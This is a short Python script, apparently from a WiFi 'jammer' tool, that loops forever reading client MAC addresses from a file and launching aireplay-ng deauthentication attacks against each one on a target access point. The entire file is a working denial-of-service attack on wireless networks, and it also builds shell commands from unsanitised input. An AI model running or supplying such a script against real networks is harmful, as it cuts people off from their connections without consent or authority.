#!/usr/bin/env python
import time
import os
import sys
APMac = sys.argv[1]
uyku=sys.argv[2]
attack=sys.argv[3]
APMac = APMac.lower()
def open_terminal(bssid,client):
	os.system('aireplay-ng -0 ' + attack + ' mon0 -a ' + bssid + ' -c ' + client)
def deauth():
	while True:
		time.sleep(int(uyku))
		global APMac
		try:
			with open('/root/Desktop/JAMMER/client.tmp') as file:
				for MAC in file:
					print MAC
					open_terminal(APMac,MAC)
		except IOError:
			continue
deauth()

